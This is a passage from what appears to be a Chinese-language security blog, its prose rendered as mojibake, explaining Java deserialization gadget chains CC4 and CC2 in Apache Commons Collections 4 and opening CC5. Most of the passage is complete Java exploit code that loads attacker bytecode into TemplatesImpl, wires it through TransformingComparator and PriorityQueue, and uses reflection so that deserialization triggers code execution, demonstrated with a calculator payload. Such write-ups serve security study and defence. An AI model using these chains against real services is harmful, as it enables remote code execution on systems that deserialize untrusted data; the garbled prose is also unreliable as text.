class="hljs-comment">//è¯´ç™½äº†è¿™é‡Œå°±æ˜¯ç»™transformerèµ‹å€¼æˆchainedTransformerï¼Œç„¶åå»è°ƒå®ƒçš„transformæ–¹æ³•</span><br></code></pre></td></tr></table></figure>

<p>ä½†è¿™é‡Œåºåˆ—åŒ–åååºåˆ—åŒ–æ˜¯ä¸ä¼šå¼¹è®¡ç®—å™¨çš„ï¼Œé—®é¢˜å‡ºåœ¨ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/">å‚è€ƒæ–‡ç« </a></p>
<p>ç®€å•è®²å°±æ˜¯è¿™ä¸ªä¼˜å…ˆé˜Ÿåˆ—çš„é•¿åº¦å¾—æ˜¯2ï¼Œæ‰èƒ½è¿›<code>SitDown</code>æ–¹æ³•é‡Œã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-comment">// TransformingComparator.compare çš„ EXPpublic class ComparatorEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½†æ”¹å®Œä¼šå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œé—®é¢˜å‡ºåœ¨ï¼š</p>
<p><img src="/img/CompareError.png" srcset="/img/loading.gif" lazyload alt="CompareError"></p>
<p>ç®€å•è¯´å°±æ˜¯è™½ç„¶é€šè¿‡<code>add</code>ç¡®ä¿äº†ä¼˜å…ˆé˜Ÿåˆ—é•¿åº¦ä¸º2ï¼Œä½†æ˜¯å¼•å‘äº†æ–°çš„é—®é¢˜ï¼š<code>add</code>ç›´æ¥è§¦å‘å®Œäº†è¿™æ¡é“¾å­ã€‚ä½†ä¹‹å‰é‚£æ¡<code>CC3</code>é“¾å­ä¸­æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br>templates.newTransformer();<br></code></pre></td></tr></table></figure>

<p><code>_tfactory</code>è¿™ä¸œè¥¿è¢«<code>transient</code>ä¿®é¥°ä¸èƒ½ç»™ä»–èµ‹å€¼ï¼Œä¸è¿‡å¥½åœ¨<code>readObject</code>çš„æ—¶å€™ç»™ä»–å¤åˆ¶äº†æ‰€ä»¥è®©ä»–ä¸ä¸º<code>null</code>ã€‚è¿™é‡Œç›´æ¥è¶Šè¿‡äº†<code>readObject</code>ï¼Œæ‰€ä»¥ä¸º<code>null</code>ç›´æ¥æŠ¥é”™ã€‚</p>
<p>å¦‚æœæŠŠEXPæ”¹æˆè¿™æ ·å¯ä»¥ç›´æ¥å¼¹è®¡ç®—å™¨(ä½†è¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œå› ä¸ºè¿˜æ²¡ååºåˆ—åŒ–)ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br>       <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br>       templates.newTransformer();  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(chainedTransformer)));  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br></code></pre></td></tr></table></figure>

<p>è§£å†³æ–¹æ³•å’Œå‰é¢ä¸€æ ·ï¼Œå…ˆæŠŠè¿™æ¡é“¾å­æ”¹æˆé”™çš„ï¼Œè®©ä»–<code>add</code>çš„æ—¶å€™åˆ«è§¦å‘è¿™æ¡é“¾å­ã€‚<code>add</code>å®Œäº†å†é€šè¿‡åå°„æ”¹å›å»å°±è¡Œï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br><span class="hljs-comment">//        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);  </span><br><span class="hljs-comment">//        tfactoryField.setAccessible(true);  </span><br><span class="hljs-comment">//        tfactoryField.set(templates, new TransformerFactoryImpl());  </span><br><span class="hljs-comment">//        templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));  <span class="hljs-comment">//è¿™é‡Œæœ¬åº”æ˜¯chainedTransformerï¼Œä½†æ”¹æˆäº†1</span><br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br>  <span class="hljs-comment">//æ”¹å®Œäº†å†é€šè¿‡åå°„æ”¹å›å»</span><br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">transformingField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);  <br> transformingField.setAccessible(<span class="hljs-literal">true</span>);  <br> transformingField.set(transformingComparator, chainedTransformer);  <br>  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>CC2 è¿™æ¡é“¾å®é™…ä¸Šæ˜¯åœ¨ CC4 é“¾åŸºç¡€ä¸Šçš„ä¿®æ”¹ï¼Œç›®çš„æ˜¯é¿å…ä½¿ç”¨ <code>Transformer</code> æ•°ç»„ã€‚è¿™é‡Œå’Œ<code>CC4+CB1</code>é“¾å­æœ‰ç‚¹åƒï¼Œæˆ‘æ˜¯æ‡’ç‹—å°±ç›´æ¥æ”¾EXPäº†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Anything&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Clac.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(templates);  <br> priorityQueue.add(templates);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">transformingField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);  <br> transformingField.setAccessible(<span class="hljs-literal">true</span>);  <br> transformingField.set(transformingComparator, invokerTransformer);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>









<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>å…¥å£ç±»æ˜¯ <code>BadAttributeValueExpException</code> çš„ <code>readObject()</code> æ–¹æ³•ï¼š</p>
<p><img src="/img/CC51.png" srcset="/img/loading.gif" lazyload alt="CC51"></p>
<p><code>TiedMapEntry</code> è¿™ä¸ªç±»å­˜åœ¨ <code>toString()</code> æ–¹æ³•ï¼š</p>
<p><img src="/img/CC52.png" srcset="/img/loading.gif" lazyload alt="CC52"></p>
